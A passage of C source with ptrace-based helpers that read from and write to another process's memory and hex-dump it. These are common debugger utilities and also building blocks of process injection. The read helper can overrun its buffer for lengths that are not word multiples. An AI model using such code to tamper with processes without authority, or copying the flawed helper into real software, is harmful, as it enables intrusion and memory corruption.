 * - void *vptr: a pointer to a buffer to read data into
 * - int len: the amount of data to read from the target
 *
 */
void ptrace_read(int pid, unsigned long addr, void *vptr, int len)
{
	int bytesRead = 0;
	int i = 0;
	long word = 0;
	long *ptr = (long *) vptr;

	while (bytesRead < len)
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
		if(word == -1)
		{
			fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
			exit(1);
		}
		bytesRead += sizeof(word);
		ptr[i++] = word;
	}
}


/*
 * ptrace_write()
 *
 * Use ptrace() to write to the target process' address space.
 *
 * args:
 * - int pid: pid of the target process
 * - unsigned long addr: the address to start writing to
 * - void *vptr: a pointer to a buffer containing the data to be written to the
 *   target's address space
 * - int len: the amount of data to write to the target
 *
 */
void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
{
	int byteCount = 0;
	long word = 0;

	while (byteCount < len)
	{
		memcpy(&word, vptr + byteCount, sizeof(word));
		word = ptrace(PTRACE_POKETEXT, pid, addr + byteCount, word);
		if(word == -1)
		{
			fprintf(stderr, "ptrace(PTRACE_POKETEXT) failed\n");
			exit(1);
		}
		byteCount += sizeof(word);
	}
}


void dump_pid_mem(pid_t pid, void* mem_ptr, size_t memLen)
{
	// LOCAL VARIABLES
	size_t i = 0;  // Iterating variable
	size_t j = 0;  // Iterating variable
	long readBytes = 0;  // Store the results of ptrace_read() here
	unsigned char readByte = 0;  // Store the results of ptrace_read() here

	// INPUT VALIDATION
	if (pid > 0 && mem_ptr && memLen > 0)
	{
		// fprintf(stdout, "printing %zu bytes\n", memLen);  // DEBUGGING

		for (i = 0; i < memLen; i++)
		{
			if (i > 0 && 0 == i % 16)
			{
				fprintf(stdout, "\n");
			}
			else if (i > 0 && 0 == i % 2)
			{
				fprintf(stdout, " ");
			}

			ptrace_read(pid, ((unsigned long)mem_ptr) + i, &readBytes, sizeof(long));

			readByte = 0;
			readByte |= *(&readBytes + j);
			fprintf(stdout, "%02X", (unsigned int)readByte & 0xFF);
		}

		fprintf(stdout, "\n");
	}

	// DONE
	return;
}
